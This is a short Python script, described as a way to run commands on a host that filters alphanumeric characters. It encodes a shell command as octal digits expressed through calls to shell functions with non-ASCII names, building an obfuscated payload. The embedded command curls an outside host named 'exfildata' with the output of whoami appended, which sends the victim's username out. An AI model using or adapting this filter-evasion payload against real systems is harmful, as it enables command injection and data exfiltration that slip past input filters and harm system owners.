#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
This was written to as a way to run commands on a host, where alphanumerical ascii chars were filtered.
"""

string_to_convert =  "curl https://exfildata.tevs.workers.dev/data?$(whoami)"
main = ""
for i in string_to_convert:
	main += "ä \"\\\\"
	b10 = ord(i)
	#print("{0} \t->\t {1} \t->\t {1:x} \t->\t {1:o}".format(i, b10))
	out = ""
	#converts octal value of ascii char to code
	#g -> 0o147 -> `ö ""``ö "" "" "" ""``ö "" "" "" "" "" "" ""`
	for dig in "{:o}".format(b10):
		out += "`ö"
		for x in range(int(dig)):
			out  += ' ""'
		out += "`"
	main += out
	main +="\";"

print( "ä(){ /usr/bin/printf ${@}; }; ö(){ ä ${#}; }; $(" + main + ")" )
